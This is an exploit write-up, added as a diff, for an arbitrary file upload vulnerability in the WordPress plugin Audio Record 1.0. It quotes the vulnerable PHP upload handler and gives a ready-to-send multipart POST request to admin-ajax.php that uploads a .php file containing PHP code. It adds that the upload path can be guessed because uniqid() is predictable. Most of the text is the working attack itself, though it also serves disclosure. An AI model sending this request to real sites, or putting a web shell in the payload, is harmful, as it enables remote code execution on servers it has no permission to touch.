@@ -1,0 +1,57 @@
+# Exploit Title: WordPress Plugin Audio Record 1.0 - Arbitrary File Upload
+# Date: 2018-12-24
+# Software Link: https://wordpress.org/plugins/audio-record/
+# Exploit Author: Kaimi
+# Website: https://kaimi.io
+# Version: 1.0
+# Category: webapps
+
+# Unrestricted file upload in record upload process allowing arbitrary extension.
+# File: recorder.php
+# Vulnerable code:
+function save_record_callback() {
+
+        foreach(array('audio') as $type) {
+            if (isset($_FILES["${type}-blob"])) {
+
+                $fileName = uniqid() . '_' .$_POST["${type}-filename"] ;
+                $path_array  = wp_upload_dir();
+                $path = str_replace('\\', '/', $path_array['path']);
+                $uploadDirectory = $path . "/$fileName";
+                if (!move_uploaded_file($_FILES["${type}-blob"]["tmp_name"], $uploadDirectory)) {
+                        echo 000;
+                    wp_die("problem moving uploaded file");
+                }
+
+
+# Exploitation example:
+
+POST /wp-admin/admin-ajax.php HTTP/1.1
+Host: example.com
+Content-Type: multipart/form-data; boundary=---------------------------18311719029180117571501079851
+...
+-----------------------------18311719029180117571501079851
+Content-Disposition: form-data; name="audio-filename"
+
+file.php
+-----------------------------18311719029180117571501079851
+Content-Disposition: form-data; name="audio-blob"; filename="blob"
+Content-Type: audio/wav
+
+<?php phpinfo();
+-----------------------------18311719029180117571501079851
+Content-Disposition: form-data; name="action"
+
+save_record
+-----------------------------18311719029180117571501079851
+Content-Disposition: form-data; name="course_id"
+
+undefined
+-----------------------------18311719029180117571501079851
+Content-Disposition: form-data; name="unit_id"
+
+undefined
+-----------------------------18311719029180117571501079851--
+
+# Uploaded file will be located at standard WordPress media upload directory (for ex: /wp-content/uploads/year/month/).
+# If directory listing is disabled - file name can be guessed due to cryptographically insecure nature of uniqid() call.
